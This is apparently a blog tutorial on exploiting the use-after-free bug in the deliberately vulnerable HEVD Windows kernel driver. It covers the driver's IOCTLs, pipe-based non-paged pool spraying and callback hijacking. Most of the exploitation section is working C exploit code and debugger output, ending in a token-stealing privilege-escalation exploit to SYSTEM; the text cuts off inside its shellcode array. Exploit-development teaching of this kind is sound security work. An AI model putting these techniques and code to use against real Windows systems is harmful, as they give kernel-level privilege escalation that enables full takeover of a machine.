# https://m2rc.net/posts/hevd-useafterfree/

Table of Contents

- [Introduction](https://m2rc.net/posts/hevd-useafterfree/#introduction)  - [Pre-Analysis](https://m2rc.net/posts/hevd-useafterfree/#pre-analysis)
  - [Setup](https://m2rc.net/posts/hevd-useafterfree/#setup)
  - [Analysis](https://m2rc.net/posts/hevd-useafterfree/#analysis)
  - [Windows Kernel Heap Feng Shui](https://m2rc.net/posts/hevd-useafterfree/#windows-kernel-heap-feng-shui)
  - [Interacting with the driver](https://m2rc.net/posts/hevd-useafterfree/#interacting-with-the-driver)
  - [Exploitation](https://m2rc.net/posts/hevd-useafterfree/#exploitation)
  - [Resources](https://m2rc.net/posts/hevd-useafterfree/#resources)

![f964af93f1fb462aa7a950a1869581af.png](https://m2rc.net/f964af93f1fb462aa7a950a1869581af.png)

# Introduction [\#](https://m2rc.net/posts/hevd-useafterfree/\#introduction)

In this blog we will walk through the exploitation of a Use-After-Free vulnerabiliy in a Windows Kernel Driver, we will learn about heap spraying techniques for Windows Kernel Pools, understand how to interact with Kernel Drivers and end up executing shellcode in Ring 0 by taking advantage of this Use-After-Free.

The exploitation of this bug is not that complex, so it will serve as a great example for learning how to exploit classic UAF vulnerabilities in Kernel Drivers.

I will be using the 22H2 build from Windows 11 without VBS.

## Pre-Analysis [\#](https://m2rc.net/posts/hevd-useafterfree/\#pre-analysis)

In [HackSysExtremeVulnerableDriver.c#L274](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.c#L274) is the main IOCTL handler, where the Driver receives IOCTLs from user-mode, and executes different functions based on the IOCTL code provided to it. Think of an IOCTL as a specific system call for a driver to perform an operation.

It’s quite common for kernel drivers to have a big switch statement to handle incoming IOCTLs.

![35568dddda005e1f05f0e937b676df96.png](https://m2rc.net/35568dddda005e1f05f0e937b676df96.png)

There are 4 IOCTLs related to this Use-After-Free vulnerability:

- 0x222013 -> `AllocateUaFObjectNonPagedPool` Allocates an object
- 0x222017 -> `UseUaFObjectNonPagedPool` Calls a function within that object
- 0x22201B -> `FreeUaFObjectNonPagedPool` Frees the object
- 0x22201F -> `AllocateFakeObjectNonPagedPool` Allocates a “fake”, user-provided object

The [UseAfterFreeNonPagedPool.c](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UseAfterFreeNonPagedPool.c) file contains all the functions associated with the UAF. Functions ending with `IoctlHandler` will be the ones executed when their respective IOCTL codes are passed via a `DeviceIoControl` call to the driver. These helper functions will take care of correctly passing any arguments to the actual functions (if they need any).

In [HackSysExtremeVulnerableDriver.c#L82](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/HackSysExtremeVulnerableDriver.c#L82) we can see the Device Driver is exposed with the `\Device\HackSysExtremeVulnerableDriver` name on the Object Manager. This will be important later on when we want to communicate with the driver.

## Setup [\#](https://m2rc.net/posts/hevd-useafterfree/\#setup)

I won’t walk you through the setup, but ideally you should set up a kernel debugging environment with 2 separate VMs (or a single VM with your host being the debugger), this will help us figure out how and where allocations are happening, as well as debug our exploit.

VM snapshots will also come in handy when we get to hijacking execution flow in the kernel (we may get some BSODs while troubleshooting our exploit).

## Analysis [\#](https://m2rc.net/posts/hevd-useafterfree/\#analysis)

`AllocateUaFObjectNonPagedPool` allocates an object of type `USE_AFTER_FREE_NON_PAGED_POOL` to a non-paged pool. Think of `pools` in the context of the Windows Kernel as the kernel’s heap, where one can dynamically allocate memory in Kernel space.

![f1857acdfa607df76215f4ee98cebbe6.png](https://m2rc.net/f1857acdfa607df76215f4ee98cebbe6.png)

The `USE_AFTER_FREE_NON_PAGED_POOL` struct contains a function pointer, and a 0x54 size buffer.

```c
typedef struct _USE_AFTER_FREE_NON_PAGED_POOL
{
    FunctionPointer Callback;
    CHAR Buffer[0x54];
}
```

copy

The pool is allocated using `ExAllocatePoolWithTag` with the [NonPagedPool](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type) PoolType parameter, which will make the allocated pool executable. Note this API is actually deprecated, although the only difference with its succesor, `ExAllocatePool2`, is that the latter will zero-out memory when performing the allocation to help prevent accidental leaks, but it does not make a difference for this specific UAF bug.

You can pass a `tag` (identifier) to the ExAllocatePoolWithTag function, which will help locate this pool allocation on a debugger. In this case, the tag is `kcaH` (Hack), since the pool tags are specified in reverse order.

![d058267a967557f98db849d0aa4e79f2.png](https://m2rc.net/d058267a967557f98db849d0aa4e79f2.png)

The Buffer member of the object will be filled with 0x53 ‘A’ characters and 1 null byte to terminate the string. Many debug messages will be logged, which can be received with a tool like [DebugView](https://learn.microsoft.com/en-us/sysinternals/downloads/debugview) from Sysinternals or by using WinDBG.

![bde8949e8e7edefee6c688fd2081194b.png](https://m2rc.net/bde8949e8e7edefee6c688fd2081194b.png)

Then, the `Callback` member of the object will be set to the address of the `UaFObjectCallbackNonPagedPool` function, which only logs a message.

```c
VOID UaFObjectCallbackNonPagedPool(VOID)
{
    PAGED_CODE();

    DbgPrint("[+] UseAfter Free Object Callback NonPagedPool\n");
}
```

copy

The global variable `g_UseAfterFreeObjectNonPagedPool` will be assigned the value of the `UseAfterFree` object. All of these actions will also be printed to DebugView.

`UseUaFObjectNonPagedPool` will first check if the global variable `g_UseAfterFreeObjectNonPagedPool` is not 0, check its `Callback` member, and call that function.

![60883d9eaca6e684d0676124fbd6d971.png](https://m2rc.net/60883d9eaca6e684d0676124fbd6d971.png)

`FreeUaFObjectNonPagedPool`, as its name implies, frees the object using ExFreePoolWithTag on the global variable that was assigned the `USE_AFTER_FREE_NON_PAGED_POOL` object.

![3ddbebc1e048e9390dbd6c90fc4a41b8.png](https://m2rc.net/3ddbebc1e048e9390dbd6c90fc4a41b8.png)

Please note, as the comment says, this function is only freeing the object, but never actually zeroing the pointer to the original object, making the `g_UseAfterFreeObjectNonPagedPool` global variable hold a “dangling pointer” to the (now freed) object. The memory holding the object will be marked as “free”, but there will still be a reference to the object, which introduces Use-After-Free bug.

The reason why this can be dangerous in our case is due to the object having a callback function that is called in `UseUaFObjectNonPagedPool`. If we revisit the code, we can see the `g_UseAfterFreeObjectNonPagedPool->Callback()` function would be called if its contents were not 0.

```c
if (g_UseAfterFreeObjectNonPagedPool) {
	if (g_UseAfterFreeObjectNonPagedPool->Callback) {
	    g_UseAfterFreeObjectNonPagedPool->Callback();
	}
}
```

copy

Now, since `g_UseAfterFreeObjectNonPagedPool` points to freed memory, if we could somehow overwrite the object pointed by it with our own, it would be possible to hijack the execution flow of the driver.

This could be done by doing many allocations of the same size in the non-paged pool until we were lucky enough that our object got allocated in the region of the freed memory.

Then, if we were to call `UseUaFObjectNonPagedPool` via its IOCTL, our own Callback function would be executed instead.

The function `AllocateFakeObjectNonPagedPool` takes in an argument of type `PFAKE_OBJECT_NON_PAGED_POOL` that will be allocated into another non-paged pool.

![d11cf17ca68bd3ef5e65533787b9a615.png](https://m2rc.net/d11cf17ca68bd3ef5e65533787b9a615.png)

The struct of the fake object looks like the following:

```c
typedef struct _FAKE_OBJECT_NON_PAGED_POOL
{
    CHAR Buffer[0x54 + sizeof(PVOID)];
} *PFAKE_OBJECT_NON_PAGED_POOL
```

copy

We can see the `KernelFakeObject` holds the address of the newly allocated pool with `ExAllocatePoolWithTag`.

Next, `ProbeForRead` will be called to check if the `UserFakeObject` actually comes from User-Mode, then, it will copy the memory from User-Land into Kernel-Land and null-terminate the buffer, all while providing debug output via DbgPrint.

![3edc695a29ab42a9ddfb79b95c7095cf.png](https://m2rc.net/3edc695a29ab42a9ddfb79b95c7095cf.png)

Let’s now dive into what techniques we could use to allocate our own object within the freed memory.

## Windows Kernel Heap Feng Shui [\#](https://m2rc.net/posts/hevd-useafterfree/\#windows-kernel-heap-feng-shui)

Since long ago, there have been multiple heap spraying techniques for the Windows Kernel that allow us to place lots of (almost) arbitrary-sized objects into a non-paged pool. There’s a specific technique that uses `pipes`, which can be created from User-Mode and works like the following:

1. Create a pipe using `CreatePipe`
2. Write data to the created pipe, but do not read it

As long as we don’t read the data back from the pipe, the Windows Kernel will buffer our input buffer in a non-paged pool with the `NpFr` tag. Let’s see this in action using [PoolMonX](https://github.com/zodiacon/PoolMonX).

> This technique was originally documented in [https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/](https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/), although originally intended for big pool allocations (>4KB), it works as well for smaller allocations.

First, create a pipe and write 16 bytes to it using WriteFile.

```c
int pipeWrite() {

	HANDLE hRead  = NULL;
	HANDLE hWrite = NULL;

	char buff[0x10] = { 0 };
	memset(buff, 0x41, sizeof(buff));

	if (!CreatePipe(&hRead, &hWrite, NULL, sizeof(buff))) {
		printf("[-] Error creating pipe.\n");
		return 1;
	}

	DWORD bytesWritten = 0;
	if (!WriteFile(hWrite, buff, sizeof(buff), &bytesWritten, NULL)) {
		printf("[-] Unable to write to pipe.\n");
		CloseHandle(hRead);
		CloseHandle(hWrite);
		return 1;
	}

	printf("[*] Data written to pipe, press enter to continue...\n", hRead, hWrite);
	getchar();

	CloseHandle(hRead);
	CloseHandle(hWrite);
	return 0;
}
```

copy

Before running this function, check the pool with the `NpFr` tag, as you can see, it currently has 0 bytes allocated.

![24937d1496335d7eef5fcd9c97cf87e2.png](https://m2rc.net/24937d1496335d7eef5fcd9c97cf87e2.png)

Now, after writing the data to the pipe, as long as we don’t read it back, a new non-paged pool allocation will be made with the NpFr tag, this one for exactly 80 bytes (0x50 in hex). These non-paged pool allocations will always be 0x10-bytes aligned. Since we wrote 0x10 bytes of data, we can assume there’s probably a 0x40-byte header for the `DATA_ENTRY` record.

![d71269c8a6a352b488fe3c3bd89b9702.png](https://m2rc.net/d71269c8a6a352b488fe3c3bd89b9702.png)

Checking the size of the original object from the struct, we see it’s 96 bytes (0x60 in hex), so, in theory, to write an object of the same size via a pipe, we would have to write anywhere from 0x11 to 0x20 bytes to the pipe for our buffer to have the same size.

e.g., `[0x40 header] + [0x15 input buffer] + [0xB padding] (to be 0x10 byte-aligned) = 0x60`.

![c77ca18fad9f951a25ce4df00c9628ef.png](https://m2rc.net/c77ca18fad9f951a25ce4df00c9628ef.png)

Let’s check dynamically what the actual size of the real object allocation for the driver is, just to make sure. For quick PoCs like this, I like to use a tool named [FileTest](http://www.zezula.net/en/tools/filetest.html).

## Interacting with the driver [\#](https://m2rc.net/posts/hevd-useafterfree/\#interacting-with-the-driver)

In my case, I had to recompile the driver, as the pre-compiled versions gave me some weird behavior. Once compiled, I loaded the driver by creating a new service and starting it:

```
sc.exe create HEVD binPath= C:\uaf\HEVD.sys type= kernel start= demand
sc.exe start HEVD
copy
```

Now, in FileTest, use CreateFile on `\\.\HacksysExtremeVulnerableDriver` to open a handle to the driver.

![e977c7f03d5df048f33d44a9fc9fa7b3.png](https://m2rc.net/e977c7f03d5df048f33d44a9fc9fa7b3.png)

This handle will now be used by FileTest to perform any further operations on the driver, like calling IOCTLs. Now, on DebugView, make sure `Capture Kernel` and `Enable Verbose Kernel Output` are checked in `Capture`. Once this is done, go to IOCTL on FileTest, and call DeviceIoControl with the `0x222013` IOCTL (AllocateUaFObjectNonPagedPool) to allocate the object.

![09230e999106c9cdc07443e9da3c77ca.png](https://m2rc.net/09230e999106c9cdc07443e9da3c77ca.png)

Actually, we see something different than we initially thought, the actual allocation size of the non-paged pool with the “Hack” tag is 112 bytes (0x70), so there probably is some extra data (like a header), making the actual size bigger than we thought. From the debug output, we get much information about the allocated object and the pool, which will come in handy later. Note that even if the debug messages say the pool size is “0x60”, we just saw in PoolMonX it’s actually 0x70, so, to make a non-paged pool allocation of the same size, we’ll have to write between 0x21 and 0x30 bytes of data to the pipe.

We can also check the pool’s size on the debugger using the `!pool [address]` command. If we access that memory address, we see the pool starts at `0xffffd28934ce6040`, although the actual object is allocated on `0xffffd28934ce6040+0x10`, after the pool header (`_POOL_HEADER`).

![621b2af5d37c768b012dcf60c3e77502.png](https://m2rc.net/621b2af5d37c768b012dcf60c3e77502.png)

On purple, there’s the `_POOL_HEADER` (0x10 bytes), after it, the “Callback” function pointer from the allocated object (8 bytes), followed by the 0x54 buffer (0x53 A’s + 1 null-byte to terminate the string), and finally, 4 bytes of padding at the end to align the pool to 0x10 bytes.

Now, let’s try to allocate the user-provided object and see what it looks like in memory. We’ll use FileTest once again to call the 0x22201F IOCTL (AllocateFakeObjectNonPagedPool), passing a buffer of 0x54 in size, just like in the original object. Since this fake object allocation will also have the “Hack” tag, I decided to reboot the VM (I couldn’t restart the driver for some reason) to see the results from PoolMonX more clearly.

![25b0c42f98fb2820f42c6a73993bb5ce.png](https://m2rc.net/25b0c42f98fb2820f42c6a73993bb5ce.png)

We passed a buffer of 84 bytes (0x54), from the debug output we see the “pool size” is said to be 0x5C, although checking in the debugger, we see it’s actually 0x70, as well as the real object. Again, the pool starts at `0xffffb98dab46b040`, but the actual object we provided is at `0xffffb98dab46b040+0x10`, containing our input buffer of 0x54 bytes (0x53 B’s + 1 null-byte) and 12 bytes of padding.

![759aecc1df94675b30e4e07073dcfde1.png](https://m2rc.net/759aecc1df94675b30e4e07073dcfde1.png)

Knowing how the objects look in memory, we can now work on the exploitation of the UAF bug by using the heap spraying technique with pipes and allocating many fake objects until one lands on the freed memory.

## Exploitation [\#](https://m2rc.net/posts/hevd-useafterfree/\#exploitation)

Now, onto the exploitation part. As mentioned before, we’ll be using a heap spraying technique involving pipes. But how does this technique work, and what does it accomplish?

This technique will allow us to put the heap into our desired state by making many allocations of 0x70 bytes from different non-paged pools, all by writing data to pipes and freeing the allocations sequentially, this way, we can create “holes” in between the allocations. Then, once we tell the driver to allocate the real object, there is a very high chance the object will land in one of the “holes” we created.

After the real object is freed, we will allocate many fake objects on the non-paged pool, with a high probability of overwriting the real object with our own. Since the original object held a function pointer, if we end up overwriting this pointer, we can gain control of the execution flow in Ring 0.

There are multiple steps that would have to be made in order for this to work, the first one being a “defragmentation” heap spray. Heap allocations are happening constantly on the kernel for different sizes, this makes the state of the heap unpredictable, so, in order to “normalize” this state, we can first perform a high number of 0x70 allocations. This is done so that the pool allocator will eventually look for other large sections of memory to fill those new allocations.

Once we’re finished with the initial defragmentation spray, we can perform another high number of 0x70-sized allocations, we will call this the sequential spray.

Now, there should be a large section of kernel memory with many non-paged pool allocations that look something like this:

```

    ┌─────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐
... │  0x70 pool  │ │  0x70 pool  │ │  0x70 pool  │ │  0x70 pool  │ │  0x70 pool  │ ...
    └─────────────┘ └─────────────┘ └─────────────┘ └─────────────┘ └─────────────┘
copy
```

After this, the idea would be to destroy every other allocation of the sequential spray by closing their respective pipe handles, essentially creating “holes” in the sequential allocation. Now, the section should look something like this:

```

    ┌─────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐
... │  0x70 pool  │ │  0x70 free  │ │  0x70 pool  │ │  0x70 free  │ │  0x70 pool  │ ...
    └─────────────┘ └─────────────┘ └─────────────┘ └─────────────┘ └─────────────┘

copy
```

Next, after calling `AllocateUaFObjectNonPagedPool`, the real object will likely be allocated in one of the “holes” we made. Now, `g_UseAfterFreeObjectNonPagedPool` will hold a pointer to the real object.

```
    ┌─────────────┐ ┌───────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐
... │  0x70 pool  │ │  0x70 object  │ │  0x70 pool  │ │  0x70 free  │ │  0x70 pool  │ ...
    └─────────────┘ └───────────────┘ └─────────────┘ └─────────────┘ └─────────────┘
                            ▲
                            │
                            │
                            │
                            └────── g_UseAfterFreeObjectNonPagedPool
copy
```

Then, after we call `FreeUaFObjectNonPagedPool`, the real object’s pool memory region will be marked as free, but the `g_UseAfterFreeObjectNonPagedPool` will still hold a reference to the original object (dangling pointer), since its pointer was never zeroed out.

```
                       free memory
    ┌─────────────┐ ┌───────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐
... │  0x70 pool  │ │  0x70 object  │ │  0x70 pool  │ │  0x70 free  │ │  0x70 pool  │ ...
    └─────────────┘ └───────────────┘ └─────────────┘ └─────────────┘ └─────────────┘
                            ▲
                            │
                            │              (dangling pointer)
                            │
                            └────── g_UseAfterFreeObjectNonPagedPool
copy
```

Now it’s time for the overwrite. Since the original object’s pool was marked as free, the pool allocator can now use that 0x70 space in memory. If we overwrite this region with our fake object, `g_UseAfterFreeObjectNonPagedPool` will be pointing to our fake object instead, and we could make the driver call our own function pointer by using the 0x222017 IOCTL (`UseUaFObjectNonPagedPool`).

We will achieve this overwrite by repeatedly calling `AllocateFakeObjectNonPagedPool` many times to make sure our fake object actually lands on the freed memory pointed to by `g_UseAfterFreeObjectNonPagedPool`.

```
              fakeObject->Callback = 0xDEADBEEF133F133F

    ┌─────────────┐ ┌───────────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐
... │  0x70 pool  │ │  0x70 fakeObject  │ │  0x70 pool  │ │  0x70 free  │ │  0x70 pool  │ ...
    └─────────────┘ └───────────────────┘ └─────────────┘ └─────────────┘ └─────────────┘
                              ▲
                              │
                              │
                              │
                              └──── g_UseAfterFreeObjectNonPagedPool
copy
```

Finally, we can trigger the UAF by calling `UseUaFObjectNonPagedPool` via its IOCTL, which will end up executing the code at our function pointer.

This is the PoC of everything we have so far:

```c
#include <stdio.h>
#include <Windows.h>

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef struct _FAKE_OBJECT_NON_PAGED_POOL {

	CHAR Buffer[0x54 + sizeof(PVOID)];

} FAKE_OBJECT_NON_PAGED_POOL, * PFAKE_OBJECT_NON_PAGED_POOL;

typedef struct _rwPipe {

	HANDLE hRead;
	HANDLE hWrite;

} rwPipe, * p_rwPipe;

HANDLE hDevice = NULL;

rwPipe objSpray() {

	HANDLE hRead = NULL;
	HANDLE hWrite = NULL;

	char buff[0x30] = { 0 };
	memset(buff, 0x41, sizeof(buff));

	if (!CreatePipe(&hRead, &hWrite, NULL, sizeof(buff))) {

		printf("[-] Error creating pipe, exiting...\n");
		exit(1);

	}

	DWORD bytesWritten = 0;

	if (!WriteFile(hWrite, buff, sizeof(buff), &bytesWritten, NULL)) {

		printf("[-] Error writing to pipe, exiting...\n");
		CloseHandle(hRead);
		CloseHandle(hWrite);
		exit(1);

	}

	rwPipe pipeHandles;
	pipeHandles.hRead = hRead;
	pipeHandles.hWrite = hWrite;

	return pipeHandles;

}

int main(int argc, char* argv[]) {

	hDevice = CreateFileW(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {

		printf("[-] Couldn't get HANDLE to driver, error %d\n", GetLastError());

		return 1;
	}

	printf("[i] Allocating objects for defragmentation spray...\n");

	p_rwPipe defrag_pipeHandles = (p_rwPipe)malloc(30000 * sizeof(rwPipe));

	for (int i = 0; i < 30000; i++) {

		rwPipe pipeHandle = objSpray();
		defrag_pipeHandles[i] = pipeHandle;

	}

	printf("[i] Allocating objects for sequential spray...\n");

	p_rwPipe seq_pipeHandles = (p_rwPipe)malloc(60000 * sizeof(rwPipe));

	for (int i = 0; i < 60000; i++) {

		rwPipe pipeHandle = objSpray();
		seq_pipeHandles[i] = pipeHandle;

	}

	printf("[i] Punching holes...\n");

	for (int i = 0; i < sizeof(seq_pipeHandles); i++) {
		if (i % 2 == 0) {

			rwPipe pipeHandles = seq_pipeHandles[i];
			CloseHandle(pipeHandles.hRead);
			CloseHandle(pipeHandles.hWrite);

		}
	}

	printf("[i] Calling AllocateUaFObjectNonPagedPool, IOCTL: 0x%x\n", IOCTL(0x804));

	if (!DeviceIoControl(hDevice, IOCTL(0x804), NULL, 0, NULL, 0, NULL, NULL)) {

		printf("[-] Error calling AllocateUaFObjectNonPagedPool's IOCTL, error: %d\n", GetLastError());

		return 1;
	}

	printf("[i] Calling FreeUaFObjectNonPagedPool, IOCTL: 0x%x\n", IOCTL(0x806));

	if (!DeviceIoControl(hDevice, IOCTL(0x806), NULL, 0, NULL, 0, NULL, NULL)) {

		printf("[-] Error calling FreeUaFObjectNonPagedPool's IOCTL, error: %d\n", GetLastError());

		return 1;
	}

	PFAKE_OBJECT_NON_PAGED_POOL fakeObj = (PFAKE_OBJECT_NON_PAGED_POOL)malloc(sizeof(FAKE_OBJECT_NON_PAGED_POOL));
	memset(fakeObj->Buffer, 0x41, 0x54);

	printf("[*] Writing to holes...\n");

	for (int i = 0; i < 30000; i++) {
		if (!DeviceIoControl(hDevice, IOCTL(0x807), fakeObj, sizeof(fakeObj), NULL, 0, NULL, NULL)) {

			printf("[-] Error calling AllocateFakeObjectNonPagedPool's IOCTL, error: %d\n", GetLastError());

			return 1;
		}
	}

	printf("[*] Press enter to trigger UAF...\n");
	getchar();

	if (!DeviceIoControl(hDevice, IOCTL(0x805), NULL, 0, NULL, 0, NULL, NULL)) {

		printf("[-] Error calling UseUaFObjectNonPagedPool's IOCTL, error: %d\n", GetLastError());

		return 1;
	}

	return 0;
}
```

copy

Before running the exploit, let’s set a breakpoint on the `call rcx` instruction from `UseUaFObjectNonPagedPool` at HEVD+0x87D66.

![d32bf927786327c5d553f646ca8e4b0e.png](https://m2rc.net/d32bf927786327c5d553f646ca8e4b0e.png)

After running the exploit, we can see we successfully hijacked the function pointer from `g_UseAfterFreeObjectNonPagedPool->Callback`, and it now points to 0x4141414141414141.

```
0: kd> bp HEVD+0x87D66
0: kd> g
****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******
[+] Using UaF Object
[+] g_UseAfterFreeObjectNonPagedPool: 0xFFFFC107E7914D20
[+] g_UseAfterFreeObjectNonPagedPool->Callback: 0x4141414141414141
[+] Calling Callback
Breakpoint 0 hit
HEVD+0x87d66:
fffff805`46f27d66 ffd1            call    rcx
1: kd> r
rax=ffffc107e7914d20 rbx=000000000000004d rcx=4141414141414141
rdx=0000000000000015 rsi=00000000c00000bb rdi=000000000000004d
rip=fffff80546f27d66 rsp=fffffb816da4c6b0 rbp=ffffc107de0f9520
 r8=000000000000004d  r9=0000000000000003 r10=0000000000000000
r11=0000000000000000 r12=0000000000000000 r13=0000000000000000
r14=ffffc107de0f95f0 r15=ffffc107e1854670
iopl=0         nv up ei pl nz na po nc
cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040206
HEVD+0x87d66:
fffff805`46f27d66 ffd1            call    rcx {41414141`41414141}
copy
```

The function pointer was attempted to be called, but the reason it didn’t BSOD is that the driver has a `__try``__except` exception handler when calling the `g_UseAfterFreeObjectNonPagedPool->Callback()` function.

Great, now that we can control RIP, let’s figure out a way to execute shellcode.

If you paid close attention to the disassembly earlier, the fake object’s address was held in the `rax` register, this is also confirmed by the debug output. Since the fake object was allocated using the `NonPagedPool` parameter on `ExAllocatePoolWithTag`, this memory will be executable. We can check this as well by looking at the PTE (page table entry) for the fake object’s address.

```
1: kd> r rax
rax=ffffc107e7914d20
1: kd> !pte ffffc107e7914d20
                                           VA ffffc107e7914d20
PXE at FFFF984C26130C10    PPE at FFFF984C261820F8    PDE at FFFF984C3041F9E0    PTE at FFFF986083F3C8A0
contains 0A0000013FE38863  contains 0A0000013FE3B863  contains 0A000000B1903863  contains 0A0000005C632963
pfn 13fe38    ---DA--KWEV  pfn 13fe3b    ---DA--KWEV  pfn b1903     ---DA--KWEV  pfn 5c632     -G-DA--KWEV
copy
```

As we can see, the page is writable and executable (WE).

![b7230aecea94bf1fe45c2b8d2d13e365.png](https://m2rc.net/b7230aecea94bf1fe45c2b8d2d13e365.png)

This means we could write shellcode directly in our fake object, right after the Callback function pointer, leaving us with 84 bytes of space for our shellcode, more than enough for a token-stealing shellcode.

Before doing this, let’s try to find a gadget that will allow us to call the shellcode from @rax+0x8 or similar. This will depend on your specific kernel version, so look for your own using [ropper](https://github.com/sashs/Ropper).

```
$ ropper --file ntoskrnl_10.0.22621.4317.exe --search "add al, "
...
0x00000001403fc667: add al, 0x10; call rax;
copy
```

In my case, I found a `add al, 0x10; call rax;` at ntoskrnl.exe+0x3FC667. Now, if we check this in a debugger, we’ll see it isn’t exactly calling RAX, it’s calling a function that will end up doing a `jmp rax` for us.

```
1: kd> u nt+0x3FC667
nt!SymCryptEcpointIsZero+0x1b:
fffff805`1b9fc667 0410            add     al,10h
fffff805`1b9fc669 e8728c6f00      call    nt!_guard_retpoline_indirect_rax (fffff805`1c0f52e0)
fffff805`1b9fc66e 4883c428        add     rsp,28h
fffff805`1b9fc672 c3              ret

0: kd> u fffff807`57af52e0+40
nt!_guard_retpoline_indirect_rax+0x40:
fffff807`57af5320 48890424        mov     qword ptr [rsp],rax
fffff807`57af5324 c3              ret
fffff807`57af5325 65800c255608000001 or    byte ptr gs:[856h],1
fffff807`57af532e 65f604255608000002 test  byte ptr gs:[856h],2
fffff807`57af5337 7502            jne     nt!_guard_retpoline_indirect_rax+0x5b (fffff807`57af533b)
fffff807`57af5339 eb65            jmp     nt!_guard_retpoline_exit_indirect_rax (fffff807`57af53a0)
fffff807`57af533b 0faee8          lfence
fffff807`57af533e 48ffe0          jmp     rax <--- jmp to our shellcode
copy
```

I will be using [https://github.com/wetw0rk/Sickle/blob/master/src/sickle/payloads/windows/x64/kernel\_token\_stealer.py](https://github.com/wetw0rk/Sickle/blob/master/src/sickle/payloads/windows/x64/kernel_token_stealer.py) for generating the token-stealing shellcode. Now, as noted in the script, the shellcode doesn’t return, so we’ll have to do it ourselves.

Since we are 2 call instructions deep, the return address created from the initial `call rcx` of `g_UseAfterFreeObjectNonPagedPool->Callback()` should be at rsp+8, so we’ll just have to add these instructions to our shellcode.

```
0:  48 83 c4 08             add    rsp,0x8
4:  c3                      ret
copy
```

What this shellcode will do is find the `_EPROCESS` for the SYSTEM process (always PID 4) by traversing the `nt!_EPROCESS.ActiveProcessLinks` until it finds a match, then, it will copy its `nt!_EPROCESS.Token` into the current process (our exploit’s process), elevating our privileges to `NT AUTHORITY\SYSTEM`.

Keep in mind this shellcode hardcodes the `nt!_EPROCESS.Token` offset at `nt!_EPROCESS+0x4b8`, which has changed in the recent Windows 11 24H2 version, now at `nt!_EPROCESS+0x248`.

This is the full exploit code, keep in mind the `CALL_RAX_GADGET` will have to be adjusted for your specific kernel version:

```c
#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define QWORD ULONGLONG

typedef struct _FAKE_OBJECT_NON_PAGED_POOL {

	CHAR Buffer[0x54 + sizeof(PVOID)];

} _fakeObj, * _pfakeObj;

typedef struct _rwPipe {

	HANDLE hRead;
	HANDLE hWrite;

} rwPipe, *p_rwPipe;

HANDLE hDevice = NULL;

rwPipe objSpray() {

	HANDLE hRead  = NULL;
	HANDLE hWrite = NULL;

	char buff[0x20] = { 0 };
	memset(buff, 0x41, sizeof(buff));

	if (!CreatePipe(&hRead, &hWrite, NULL, sizeof(buff))) {

		printf("[-] Error creating pipe, exiting...\n");
		exit(1);

	}

	DWORD bytesWritten = 0;

	if (!WriteFile(hWrite, buff, sizeof(buff), &bytesWritten, NULL)) {

		printf("[-] Error writing to pipe, exiting...\n");
		CloseHandle(hRead);
		CloseHandle(hWrite);
		exit(1);

	}

	rwPipe pipeHandles;
	pipeHandles.hRead  = hRead;
	pipeHandles.hWrite = hWrite;

	return pipeHandles;

}

BOOL checkEoP() {

	PTOKEN_USER pTokenUser;
	HANDLE		hToken;
	DWORD		returnLength = 0;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		return FALSE;
	}

	GetTokenInformation(hToken, TokenUser, NULL, 0, &returnLength);
	pTokenUser = (PTOKEN_USER)malloc(returnLength);
	GetTokenInformation(hToken, TokenUser, pTokenUser, returnLength, &returnLength);

	char* sidString;
	ConvertSidToStringSidA(pTokenUser->User.Sid, &sidString);

	if (strcmp(sidString, "S-1-5-18") == 0) {
		return TRUE;
	}

	return FALSE;

}

// from https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/
QWORD getBaseAddr(LPCWSTR drvName) {
	LPVOID drivers[512];
	DWORD cbNeeded;
	int nDrivers, i = 0;
	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
		WCHAR szDrivers[512];
		nDrivers = cbNeeded / sizeof(drivers[0]);
		for (i = 0; i < nDrivers; i++) {
			if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
				if (wcscmp(szDrivers, drvName) == 0) {
					return (QWORD)drivers[i];
				}
			}
		}
	}
	return 0;
}

int main(int argc, char* argv[]) {

	hDevice = CreateFileW(L"\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {

		printf("[-] Couldn't get HANDLE to driver, error %d\n", GetLastError());

		return 1;
	}

	QWORD ntBase = getBaseAddr(L"ntoskrnl.exe");
	printf("[*] leaked ntoskrnl base @ 0x%016llx\n", ntBase);

	// sickle.py --format c --payload windows/x64/kernel_token_stealer
	unsigned char shellcode[] =
		"\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00\x48\x8b\x80"
